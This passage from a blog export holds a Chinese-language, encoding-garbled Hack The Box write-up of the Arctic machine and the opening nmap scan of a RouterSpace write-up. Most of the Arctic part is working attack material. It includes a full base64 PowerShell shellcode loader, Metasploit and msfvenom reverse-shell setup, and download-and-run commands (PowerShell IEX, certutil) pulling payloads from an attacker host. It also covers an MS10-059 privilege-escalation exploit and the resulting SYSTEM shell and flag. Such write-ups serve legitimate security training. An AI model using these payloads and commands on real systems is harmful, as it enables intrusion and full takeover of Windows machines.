QBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA&#39;+&#39;==&#39;)&quot; ä¸€ä¸ªæ˜¯ powershell çš„æ”»å‡»ä»£ç  æˆ‘ä»¬å¤åˆ¶è¿›å» ç„¶åæˆ‘ä»¬ä½¿ç”¨ msfconsole åŠ è½½ unicorn.rc â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn] â””â”€# msfconsole -r unicorn.rc .,,. . .\\$$$$$L..,,==aaccaacc%#s$b. d8, d8P d8P #$$$$$$$$$$$$$$$$$$$$$$$$$$$b. `BP d888888p d888888P &#39;7$$$$\\&quot;&quot;&quot;&quot;&#39;&#39;^^`` .7$$$|D*&quot;&#39;``` ?88&#39; d8bd8b.d8p d8888b ?88&#39; d888b8b _.os#$|8*&quot;` d8P ?8b 88P 88P`?P&#39;?P d8b_,dP 88P d8P&#39; ?88 .oaS###S*&quot;` d8P d8888b $whi?88b 88b d88 d8 ?8 88b 88b 88b ,88b .osS$$$$*&quot; ?88,.d88b, d88 d8P&#39; ?88 88P `?8b d88&#39; d88b 8b`?8888P&#39;`?8b`?88P&#39;.aS$$$$Q*&quot;` `?88&#39; ?88 ?88 88b d88 d88 .a#$$$$$$&quot;` 88b d8P 88b`?8888P&#39; ,s$$$$$$$&quot;` 888888P&#39; 88n _.,,,ass;: .a$$$$$$$P` d88P&#39; .,.ass%#S$$$$$$$$$$$$$$&#39; .a$###$$$P` _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$&#39; ,a$$###$$P` _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS&#39; .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--&quot;&quot;&#39;&#39;^^/$$$$$$&#39; _______________________________________________________________ ,&amp;$$$$$$&#39;_____ ll&amp;&amp;$$$$&#39; .;;lll&amp;&amp;&amp;&amp;&#39; ...;;lllll&amp;&#39; ......;;;llll;;;.... ` ......;;;;... . . =[ metasploit v6.0.45-dev ] + -- --=[ 2134 exploits - 1139 auxiliary - 364 post ] + -- --=[ 592 payloads - 45 encoders - 10 nops ] + -- --=[ 8 evasion ] Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again [*] Processing unicorn.rc for ERB directives. resource (unicorn.rc)&gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp resource (unicorn.rc)&gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp resource (unicorn.rc)&gt; set LHOST 10.10.16.4 LHOST =&gt; 10.10.16.4 resource (unicorn.rc)&gt; set LPORT 5555 LPORT =&gt; 5555 resource (unicorn.rc)&gt; set ExitOnSession false ExitOnSession =&gt; false resource (unicorn.rc)&gt; set AutoVerifySession false AutoVerifySession =&gt; false resource (unicorn.rc)&gt; set AutoSystemInfo false AutoSystemInfo =&gt; false resource (unicorn.rc)&gt; set AutoLoadStdapi false AutoLoadStdapi =&gt; false resource (unicorn.rc)&gt; exploit -j [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 10.10.16.4:5555 â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn] â””â”€# cat powershell_attack.txt|xclip æŠŠ poweshell çš„æ”»å‡»è„šæœ¬å¤åˆ¶åˆ°å‰ªåˆ‡æ¿ powershell /w 1 /C &quot; åˆ æ‰å‰é¢çš„å†…å®¹å’Œæœ€åçš„åŒå¼•å· sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() (&#39;JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg&#39;+&#39;ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgAEkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArACIAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA&#39;+&#39;==&#39;) ä¿å­˜åˆ° exploit.html â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... å¼€å¯ä¸€ä¸ª HTTP æœåŠ¡å™¨ powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.16.4/exploit.html&#39;)&quot; åœ¨æˆ‘ä»¬çš„ shell é‡Œä½¿ç”¨ powershell ä¸‹è½½åˆšæ‰çš„ shell ä½†æ˜¯æœ€åæˆ‘è¿˜æ˜¯å¤±è´¥äº† æˆåŠŸçš„æ–¹æ³•â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Arctic] â””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=5555 -f exe &gt; exploit.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 354 bytes Final size of exe file: 73802 bytes ä½¿ç”¨ msfvenom ç”Ÿæˆä¸€ä¸ª exe çš„ payload msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp ç„¶ååœ¨ msf é‡Œä½¿ç”¨ä¸Šé¢çš„æ¨¡å— msf6 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target ç„¶åä¿®æ”¹ä¸€ä¸‹ msf çš„é…ç½®æ–‡ä»¶ msf6 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 5555 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target è®¾ç½®å¥½ä»¥åå¼€å§‹ç›‘å¬ msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:5555 certutil.exe -urlcache -split -f &quot;http://10.10.16.4/exploit.exe&quot; exploit.exe ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤è¿›è¡Œä¸‹è½½ exploit.exe â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49738 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\ColdFusion8\\runtime\\bin&gt;certutil.exe -urlcache -split -f &quot;http://10.10.16.4/exploit.exe&quot; exploit.exe certutil.exe -urlcache -split -f &quot;http://10.10.16.4/exploit.exe&quot; exploit.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. æˆåŠŸä¸‹è½½ ç„¶åè¿è¡Œä¸€ä¸‹ C:\\ColdFusion8\\runtime\\bin&gt;exploit.exe exploit.exe msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:5555 [*] Sending stage (175174 bytes) to 10.10.10.11 [*] Meterpreter session 1 opened (10.10.16.4:5555 -&gt; 10.10.10.11:49746) at 2022-03-24 04:31:53 -0400 meterpreter &gt; getuid Server username: ARCTIC\\tolis æˆåŠŸç”¨ msf æ‹¿åˆ°äº† shell Rootä½¿ç”¨ ms10-059 https://github.91chi.fun/https://github.com/LucifielHack/windows-kernel-exploits-1.git ç„¶åä½¿ç”¨ certutil å°†æˆ‘ä»¬çš„ Chimichurri.exe ä¸‹è½½è¿›å» certutil.exe -urlcache -split -f &quot;http://10.10.16.4/Chimichurri.exe&quot; Chimichurri.exe ç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 5555 listening on [any] 5555 ... C:\\ColdFusion8\\runtime\\bin&gt;certutil.exe -urlcache -split -f &quot;http://10.10.16.4/Chimichurri.exe&quot; Chimichurri.exe certutil.exe -urlcache -split -f &quot;http://10.10.16.4/Chimichurri.exe&quot; Chimichurri.exe **** Online **** 000000 ... 0bf800 CertUtil: -URLCache command completed successfully. â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49208 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\ColdFusion8\\runtime\\bin&gt;whoami whoami nt authority\\system æˆåŠŸæ‹¿åˆ° system æƒé™ C:\\Users\\Administrator\\Desktop&gt;type c:\\users\\administrator\\desktop\\root.txt type c:\\users\\administrator\\desktop\\root.txt fa6be5a3ab5fb06b70586f96932c3e09 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"RouterSpace - Hackthebox","slug":"Hackthebox - RouterSpace","date":"2022-03-25T11:38:36.000Z","updated":"2023-05-20T02:57:54.000Z","comments":true,"path":"2022/03/25/Hackthebox - RouterSpace/","link":"","permalink":"http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20RouterSpace/","excerpt":"","text":"Hackthebox - RouterSpaceé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.148 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 21:16 EST Nmap scan report for 10.10.11.148 Host is up (0.28s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 80/tcp open http | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-76343 | Content-Type: text/html; charset=utf-8 | Content-Length: 78 | ETag: W/&quot;4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4&quot; | Date: Mon, 28 Feb 2022 02:17:00 GMT | Connection: close | Suspicious activity detected !!! {RequestID: j7Q X53 Qp3 9o 7 B2JL } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-10824 | Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/&quot;652c-17d476c9285&quot; | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: Mon, 28 Feb 2022 02:16:56 GMT | Connection: close | &lt;!doctype html&gt; | &lt;html class=&quot;no-js&quot; lang=&quot;zxx&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;utf-8&quot;&gt; | &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt; | &lt;title&gt;RouterSpace&lt;/title&gt; | &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; | &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/owl.carousel.min.css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/magnific-popup.css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/themify-icons.css&quot;&gt; | HTTPOptions: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-97983 | Allow: GET,HEAD,POST | Content-Type: text/html; charset=utf-8 | Content-Length: 13 | ETag: W/&quot;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&quot; | Date: Mon, 28 Feb 2022 02:16:57 GMT | Connection: close | GET,HEAD,POST | RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request |_ Connection: close 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port22-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(NULL SF:,29,&quot;SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n&quot;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(GetR SF:equest,13E4,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\n SF:X-Cdn:\\x20RouterSpace-10824\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-Control SF::\\x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\x20202 SF:1\\x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\&quot;652c-17d476c9285\\&quot;\\r\\nContent-Type SF::\\x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDate:\\x SF:20Mon,\\x2028\\x20Feb\\x202022\\x2002:16:56\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20class=\\&quot;no-js\\&quot;\\x20lang=\\&quot;zxx\\&quot;&gt;\\n&lt; SF:head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\&quot;utf-8\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;me SF:ta\\x20http-equiv=\\&quot;x-ua-compatible\\&quot;\\x20content=\\&quot;ie=edge\\&quot;&gt;\\n\\x20\\x20\\ SF:x20\\x20&lt;title&gt;RouterSpace&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\&quot;desc SF:ription\\&quot;\\x20content=\\&quot;\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\&quot;viewport\\&quot;\\ SF:x20content=\\&quot;width=device-width,\\x20initial-scale=1\\&quot;&gt;\\n\\n\\x20\\x20\\x20\\ SF:x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/bootstrap\\.min\\.css\\&quot;&gt;\\n\\x SF:20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/owl\\.carousel\\. SF:min\\.css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/ SF:magnific-popup\\.css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20 SF:href=\\&quot;css/font-awesome\\.min\\.css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;st SF:ylesheet\\&quot;\\x20href=\\&quot;css/themify-icons\\.css\\&quot;&gt;\\n\\x20&quot;)%r(HTTPOptions,10 SF:8,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20 SF:RouterSpace-97983\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20text/h SF:tml;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\&quot;d-bMedpZ SF:YGrVt1nR4x\\+qdNZ2GqyRo\\&quot;\\r\\nDate:\\x20Mon,\\x2028\\x20Feb\\x202022\\x2002:16 